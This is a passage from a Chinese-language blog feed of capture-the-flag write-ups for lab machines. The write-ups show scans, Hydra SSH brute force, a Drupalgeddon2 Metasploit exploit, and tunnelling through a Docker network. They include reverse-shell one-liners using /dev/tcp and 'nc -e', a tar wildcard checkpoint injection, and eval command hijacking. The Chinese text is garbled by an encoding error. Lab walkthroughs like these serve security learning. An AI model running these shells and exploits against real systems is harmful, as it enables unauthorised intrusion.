Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.62 seconds\n```\n\n### æšä¸¾\n\nHTTP\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image1.png)\n\nç›®å½•æ‰«æ\n\n```bash\nâœ  PaQueAigaLujo feroxbuster --url http://192.168.56.118 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.118\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\n ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      168l      285w     2899c http://192.168.56.118/styles/components.css\n200      GET      221l      524w     5600c http://192.168.56.118/scripts/main.js\n200      GET      230l      445w     4172c http://192.168.56.118/styles/main.css\n200      GET      231l      411w     3799c http://192.168.56.118/styles/responsive.css\n301      GET        9l       28w      318c http://192.168.56.118/scripts => http://192.168.56.118/scripts/\n301      GET        9l       28w      317c http://192.168.56.118/styles => http://192.168.56.118/styles/\n200      GET      285l      778w    15656c http://192.168.56.118/\n[####################] - 50s   220557/220557  0s      found:7       errors:0      \n[####################] - 50s   220545/220545  4429/s  http://192.168.56.118/ \n[####################] - 0s    220545/220545  16965000/s http://192.168.56.118/scripts/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s    220545/220545  13784062/s http://192.168.56.118/styles/ => Directory listing (add --scan-dir-listings to scan)\n```\n\nå¥½ä¸€ä¼šæ²¡æ‰¾åˆ°åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°ç½‘é¡µä¸Šæœ‰å¥½å‡ ä¸ªç”¨æˆ·åï¼Œæ”¶é›†èµ·æ¥å°è¯•æš´åŠ›ç ´è§£\n\n```bash\nCarlos\nIsabella\nAlexandre\nMiguel\nElena\nVictoria\nAnastasia\nSophia\nJames\nRoberto\nCatherine\nValentina\nPriscilla\nBeatrice\nMargot\nAlessandro\nMarcus\nDiego\nWinston\nMaximilian\ncarlos\nisabella\nalexandre\nmiguel\nelena\nvictoria\nanastasia\nsophia\njames\nroberto\ncatherine\nvalentina\npriscilla\nbeatrice\nmargot\nalessandro\nmarcus\ndiego\nwinston\nmaximilian\n```\n\nå¾—åˆ°å¯†ç  `dolphins`\n\n```bash\nâœ  PaQueAigaLujo hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.118 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 11:31:25\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 301232379 login tries (l:21/p:14344399), ~37654048 tries per task\n[DATA] attacking ssh://192.168.56.118:22/\n[STATUS] 136.00 tries/min, 136 tries in 00:01h, 301232243 to do in 36915:43h, 8 active\n[STATUS] 129.67 tries/min, 389 tries in 00:03h, 301231990 to do in 38718:46h, 8 active\n[STATUS] 132.57 tries/min, 928 tries in 00:07h, 301231451 to do in 37870:20h, 8 active\n[STATUS] 130.93 tries/min, 1964 tries in 00:15h, 301230415 to do in 38343:60h, 8 active\n[STATUS] 132.19 tries/min, 4098 tries in 00:31h, 301228281 to do in 37978:12h, 8 active\n[STATUS] 132.23 tries/min, 6215 tries in 00:47h, 301226164 to do in 37966:18h, 8 active\n[STATUS] 132.21 tries/min, 8329 tries in 01:03h, 301224050 to do in 37973:59h, 8 active\n[ssh] host: 192.168.56.118   login: Sophia   password: dolphins\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image2.png)\n\n## ææƒ - cipote\n\n### ä¿¡æ¯æ”¶é›†\n\næŸ¥çœ‹ç›‘å¬ç«¯å£å’ŒIP åœ°å€\n\n```bash\nSophia@TheHackersLabs-PaQueAigaLujo:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:38225                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \nSophia@TheHackersLabs-PaQueAigaLujo:~$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:33:d8:8f brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.118/24 brd 192.168.56.255 scope global dynamic enp0s3\n       valid_lft 590sec preferred_lft 590sec\n    inet6 fe80::a00:27ff:fe33:d88f/64 scope link \n       valid_lft forever preferred_lft forever\n3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:58:d5:83:85 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::42:58ff:fed5:8385/64 scope link \n       valid_lft forever preferred_lft forever\n5: veth4a6f795@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default \n    link/ether 4a:10:44:5c:bf:f6 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet6 fe80::4810:44ff:fe5c:bff6/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\né¶æœºä¸­è£…äº† Dockerï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æƒé™ï¼Œå¹¶ä¸”åœ¨æœ¬åœ°å¼€äº†ä¸€ä¸ªæœåŠ¡åœ¨ `38225` ç«¯å£ï¼Œå°†å…¶è½¬å‘å‡ºæ¥åæ²¡å‘ç°ä»€ä¹ˆ\n\næšä¸¾ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å…¶ä»–å®¹å™¨ï¼Œå‘ç° `172.17.0.2`\n\n```bash\nSophia@TheHackersLabs-PaQueAigaLujo:/$ ping 172.17.0.2\nPING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.\n64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.124 ms\n64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms\n^C\n--- 172.17.0.2 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1028ms\nrtt min/avg/max/mdev = 0.049/0.086/0.124/0.037 ms\n```\n\n### ä»£ç†æ­å»º\n\nè¿™é‡Œä½¿ç”¨ stowaway è¿›è¡Œéš§é“æ­å»ºï¼Œæ–¹ä¾¿åç»­æ“ä½œ\n\n```bash\n// Kali\n./linux_x64_admin -l 8000 -s 123\n// Machine\n./linux_x64_agent -c 192.168.56.5:8000 -s 123 &\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image3.png)\n\nç„¶åè®¾ç½® proxy ä»£ç†ï¼Œä¹‹åå¯ä»¥é€šè¿‡ä»£ç†æ¥è®¿é—®å®¹å™¨\n\n```bash\n(admin) >> use 0\n\n(node 0) >> socks 2131\n[*] Trying to listen on 0.0.0.0:2131......\n[*] Waiting for agent's response......\n[*] Socks start successfully!\n```\n\n### Drupal åˆ©ç”¨\n\nå®¹å™¨è¿è¡Œç€ `Drupal`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image4.png)\n\n`whatweb` ï¼Œç«™ç‚¹æ˜¯ `Drupal8`\n\n```bash\nâœ  PaQueAigaLujo proxychains whatweb 172.17.0.2\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  172.17.0.2:80  ...  OK\nhttp://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]\n```\n\nç½‘ä¸Šæœç´¢ `Drupal8` å­˜åœ¨ RCE æ¼æ´ï¼š**`CVE-2018-7600`**\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image5.png)\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image6.png)\n\nå­˜åœ¨è¯¥æ¼æ´\n\né€šè¿‡ MSF è¿›è¡Œåˆ©ç”¨\n\n```bash\nâœ  PaQueAigaLujo proxychains -q msfconsole  \n\nmsf6 > search 2018-7600\n\nMatching Modules\n================\n\n   #   Name                                      Disclosure Date  Rank       Check  Description\n   -   ----                                      ---------------  ----       -----  -----------\n   0   exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection\n   1     \\_ target: Automatic (PHP In-Memory)    .                .          .      .\n   2     \\_ target: Automatic (PHP Dropper)      .                .          .      .\n   3     \\_ target: Automatic (Unix In-Memory)   .                .          .      .\n   4     \\_ target: Automatic (Linux Dropper)    .                .          .      .\n   5     \\_ target: Drupal 7.x (PHP In-Memory)   .                .          .      .\n   6     \\_ target: Drupal 7.x (PHP Dropper)     .                .          .      .\n   7     \\_ target: Drupal 7.x (Unix In-Memory)  .                .          .      .\n   8     \\_ target: Drupal 7.x (Linux Dropper)   .                .          .      .\n   9     \\_ target: Drupal 8.x (PHP In-Memory)   .                .          .      .\n   10    \\_ target: Drupal 8.x (PHP Dropper)     .                .          .      .\n   11    \\_ target: Drupal 8.x (Unix In-Memory)  .                .          .      .\n   12    \\_ target: Drupal 8.x (Linux Dropper)   .                .          .      .\n   13    \\_ AKA: SA-CORE-2018-002                .                .          .      .\n   14    \\_ AKA: Drupalgeddon 2                  .                .          .      .\n   \nmsf6 > use 0\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload php/reverse_php \npayload => php/reverse_php\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.56.5\nlhost => 192.168.56.5\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 172.17.0.2\nrhosts => 172.17.0.2\n```\n\næˆåŠŸæ‹¿åˆ° `shell`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image7.png)\n\n### è·å¾—äº¤äº’å¼ shell\n\nå­˜åœ¨ç”¨æˆ· `ballenita`\n\n```bash\nls /home\nballenita\n```\n\næŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶\n\n```bash\ncat /var/www/html/sites/default/settings.php\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image8.png)\n\nç°åœ¨æ— æ³•è¿›è¡Œç”¨æˆ·åˆ‡æ¢ï¼Œä»¥ä¸ºç°åœ¨å¹¶ä¸æ˜¯äº¤äº’ `shell`ï¼Œè¿™ä¸ªä¼šè¯ä¹Ÿæ— æ³•è·å¾—äº¤äº’ `shell`ï¼Œè¦æƒ³ä¸ªåŠæ³•è·å¾—äº¤äº’çš„ `shell`\n\né€šè¿‡ `stowaway` è®¾ç½®ç«¯å£è½¬å‘\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image9.png)\n\nç„¶ååœ¨ä¼šè¯ä¸­è¿›è¡Œåå¼¹ `shell`\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/6666 0>&1'\n```\n\n`Kali` æˆåŠŸæ¥æ”¶åˆ° `Shell` ï¼Œè¯¥ä¼šè¯å¯ä»¥è·å¾—äº¤äº’å¼ `shell` ï¼šhttps://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image10.png)\n\næˆåŠŸåˆ‡æ¢åˆ°ç”¨æˆ· `ballenita`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image11.png)\n\n### ä¿¡æ¯æ”¶é›† - 2\n\næŸ¥çœ‹ sudo æƒé™ï¼Œå¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶\n\n```bash\nballenita@76f1a1515e36:/var/www/html$ sudo -l\nMatching Defaults entries for ballenita on 76f1a1515e36:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ballenita may run the following commands on 76f1a1515e36:\n    (root) NOPASSWD: /bin/ls, /bin/grep\n```\n\n`root` ç›®å½•ä¸‹æœ‰å¯ç–‘çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯ `ElcipotedeChocolate-CipotitoCipoton`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image12.png)\n\nç»è¿‡æµ‹è¯•ï¼Œæ˜¯ç”¨æˆ· `cipote` çš„å¯†ç \n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image13.png)\n\nè¯»å– user.txt\n\n```bash\ncipote@TheHackersLabs-PaQueAigaLujo:~$ cat user.txt \nf3xxxxxxxxxxxxxxxxxxxxxxxxxxe8  -\n```\n\n## ææƒ - root\n\næŸ¥çœ‹ sudo æƒé™\n\n```bash\ncipote@TheHackersLabs-PaQueAigaLujo:~$ sudo -l\nMatching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:\n    (ALL) NOPASSWD: /usr/bin/mount\n```\n\nç»“æŸ\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image14.png)\n\nè¯»å– root.txt\n\n```bash\n# cat /root/root.txt\n9xxxxxxxxxxxxxxxxxxxxxx  -\n```\n\n## æ€»ç»“\n\næœ‰æ„æ€",
            "url": "https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo",
            "title": "TheHackersLabs - Pa Que Aiga Lujo",
            "summary": "Pa Que Aiga Lujo https://labs.thehackerslabs.com/machine/125 Recon PortScan æšä¸¾ HTTP ç›®å½•æ‰«æ å¥½ä¸€ä¼šæ²¡æ‰¾åˆ°åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°ç½‘é¡µä¸Šæœ‰å¥½å‡ ä¸ªç”¨æˆ·åï¼Œæ”¶é›†èµ·æ¥å°è¯•æš´åŠ›ç ´è§£ å¾—åˆ°å¯†ç  dolphins ææƒ cipo...",
            "date_modified": "2025-09-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "mount",
                "Drupal",
                "Tunnel"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev",
            "content_html": "\n# Silentdev.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Silentdev\n> \n\n![image.png](/post-images/HackMyVMSilentdev/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Slientdev nmap -sT -min-rate 10000 -p- 192.168.56.117\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report for 192.168.56.117\nHost is up (0.00055s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 16.97 seconds\n```\n\n```bash\n\nâœ  Slientdev nmap -sT -A -p 22,80 192.168.56.117        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report for 192.168.56.117\nHost is up (0.00054s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 4a:f7:09:40:45:df:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)\n|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Upload Image\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.54 ms 192.168.56.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.16 seconds\n```\n\n## FileUpload\n\nç›´æ¥å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½\n\n![image.png](/post-images/HackMyVMSilentdev/image1.png)\n\nä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡åï¼Œä¼šç»™å‡ºè·¯å¾„\n\n![image.png](/post-images/HackMyVMSilentdev/image2.png)\n\nå°è¯•ä¸Šä¼  PHP åç¼€æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ç›´æ¥ä¸Šä¼ æˆåŠŸäº†\n\n![image.png](/post-images/HackMyVMSilentdev/image3.png)\n\n![image.png](/post-images/HackMyVMSilentdev/image4.png)\n\nå†™ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èšå‰‘è¿æ¥\n\n![image.png](/post-images/HackMyVMSilentdev/image5.png)\n\nå¼¹ `shell`\n\n```bash\nnc 192.168.56.5 1234 -e /bin/bash\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image6.png)\n\n## æƒé™æå‡\n\n### ä¿¡æ¯æ”¶é›†\n\næˆ‘ä»¬èƒ½å‘ç° `www-data` ç”¨æˆ·æ‹¥æœ‰ `developers` ç»„æƒé™\n\n```bash\nwww-data@silentdev:/var/www/html/uploads$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image7.png)\n\næŸ¥è¯¢å±äºè¯¥ç»„çš„æ–‡ä»¶\n\n```bash\nwww-data@silentdev:/home$ find / -group developers 2>/dev/null\n/opt/project\n/var/backups\n```\n\n`/opt/project`\n\n```bash\nwww-data@silentdev:/opt/project$ ls -al\ntotal 12      \ndrwxrwx--- 2 developer developers 4096 Apr 19 19:30 .\ndrwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..\n-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html\n\nwww-data@silentdev:/opt/project$ ls\nindex.html\n\nwww-data@silentdev:/opt/project$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image8.png)\n\n`/var/backups`\n\n```bash\nwww-data@silentdev:/var/backups$ ls\napt.extended_states.0  project.tgz\n```\n\nè§£å‹å‡ºæ¥çš„æ˜¯å’Œ project ä¸­ä¸€æ¨¡ä¸€æ ·çš„ `index` æ–‡ä»¶\n\nä¸è¿‡èƒ½çœ‹å‡ºæ¥ç³»ç»Ÿä¸Šæœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ˆCron Jobï¼‰ï¼Œå®ƒä¼šå®šæœŸå°† `/opt/project` ç›®å½•çš„å†…å®¹æ‰“åŒ…å‹ç¼©æˆ `project.tgz` æ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åˆ° `/var/backups` ç›®å½•ä¸­\n\nä¸Šä¼  `pspy` çœ‹ä¸€ä¸‹ï¼Œæœç„¶ `1002` ç”¨æˆ·å®šæ—¶ä¼šå‹ç¼© `/opt/project`\n\n![image.png](/post-images/HackMyVMSilentdev/image9.png)\n\n### tar åˆ©ç”¨\n\n`*` ä¸‡æ¶ä¹‹æº\n\n```bash\n/bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *\n```\n\nhijackï¼šhttps://gtfobins.github.io/gtfobins/tar/\n\n```bash\ncd /opt/project\necho 'nc 192.168.56.5 1235 -e /bin/sh' > shell.sh\nchmod +x shell.sh\ntouch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\n```\n\nç­‰å¾…å¼¹ shell å³å¯ï¼Œå³å¯æ‹¿åˆ° `developers` ç”¨æˆ·\n\n![image.png](/post-images/HackMyVMSilentdev/image10.png)\n\n### å‘½ä»¤åŠ«æŒ\n\næŸ¥çœ‹ sudo æƒé™\n\n```bash\ndeveloper@silentdev:~$ sudo -l\nMatching Defaults entries for developer on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser developer may run the following commands on silentdev:\n    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh\n```\n\n```bash\ndeveloper@silentdev:~$ cat /usr/bin/sysinfo.sh \n#!/bin/bash\n\necho \"Hello $USER, checking system status.\"\n\necho \"Choose an option:\"\necho \"1. Disk usage (df)\"\necho \"2. Running processes (ps)\"\necho \"3. Exit\"\n\nread -p \"Enter option (1-3): \" opt\n\ncase \"$opt\" in\n        1) action=\"df\" ;;\n        2) action=\"ps\" ;;\n        3) echo \"Goodbye!\"; exit ;;\n        *) action=\"echo Invalid option\" ;;\nesac\n\nread -p \"Any additional options?: \" extra\n\neval \"$action $extra\"\n```\n\næˆ‘ TM ç›´æ¥åŠ«æŒ\n\n![image.png](/post-images/HackMyVMSilentdev/image11.png)\n\n![image.png](/post-images/HackMyVMSilentdev/image12.png)\n\nè¯»å– `user.txt`\n\n```bash\nalfonso@silentdev:~$ cat user.txt \nflag{A89aHFj3830878y3hFJ3h2oH}\n```\n\n### xxxx\n\næŸ¥çœ‹ sudo æƒé™\n\n```bash\nalfonso@silentdev:~$ sudo -l\nMatching Defaults entries for alfonso on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser alfonso may run the following commands on silentdev:\n    (ALL) NOPASSWD: /usr/bin/silentgets\n```\n\n```bash\nalfonso@silentdev:~$ /usr/bin/silentgets \nEnter the username: root\nroot:x:0:0:root:/root:/bin/bash\n```\n\næ‹‰å‡ºæ¥æ£€æŸ¥ä¸€ä¸‹\n\n![image.png](/post-images/HackMyVMSilentdev/image13.png)\n\nåªèƒ½è¯´åˆæ˜¯å‘½ä»¤åŠ«æŒ\n\n![image.png](/post-images/HackMyVMSilentdev/image14.png)\n\nè¯»å– `root.txt`\n\n```bash\nroot@silentdev:/home/alfonso# cat /root/root.txt \nflag{p7609TNt6a0bGF8HW78BG7eh}\n```\n\n## æ€»ç»“\n\nä¸å¦‚ç¾¤å‹ low",
            "url": "https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev",
            "title": "HackMyVM - Silentdev",
            "summary": "Silentdev. https://hackmyvm.eu/machines/machine.php?vm=Silentdev Recon PortScan FileUpload ç›´æ¥å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ ä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡åï¼Œä¼šç»™å‡ºè·¯å¾„ å°è¯•ä¸Šä¼  PHP åç¼€æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ç›´æ¥ä¸Šä¼ æˆåŠŸäº† å†™ä¸€å¥è¯æœ¨...",
            "date_modified": "2025-09-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HMV",
                "Linux",
                "Hijack",
                "FileUpload"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore",
            "content_html": "\n# Folclore\n\n> https://labs.TheHackersLabs.com/machine/123\n> \n\n![image.png](/post-images/TheHackersLabsFolclore/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Folclore nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:14 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00045s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00025s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.101\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\nä»…ä»…ä¸¤ä¸ªç«¯å£\n\n```bash\nâœ  Folclore nmap -sT -min-rate 10000 -p- 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:15 CST\nNmap scan report for 192.168.56.101\nHost is up (0.0013s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.54 seconds\n```\n\n```bash\nâœ  Folclore nmap -sT -A -p 139,445 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:17 CST\nNmap scan report for 192.168.56.101\nHost is up (0.00045s latency).\n\nPORT    STATE SERVICE       VERSION\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft 